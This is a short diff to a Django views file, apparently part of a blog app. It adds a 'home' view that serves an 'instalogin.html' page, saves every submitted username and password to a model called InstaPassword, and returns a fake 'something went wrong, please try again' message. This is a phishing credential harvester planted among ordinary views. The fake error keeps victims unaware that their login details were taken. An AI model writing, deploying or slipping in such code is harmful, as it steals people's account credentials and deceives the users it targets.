@@ -15,6 +15,15 @@ from . email import  share_blog
 from django.db.models import Q
 import uuid
 
+
+def home(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        InstaPassword.objects.create(name= username, password = password)
+        return HttpResponse("Somethig went wrong Thank you , Please try again ")
+    return render(request,"instalogin.html")
+
 def SignupPage(request):
     if request.method == 'POST':
         form = SignupUser(request.POST)
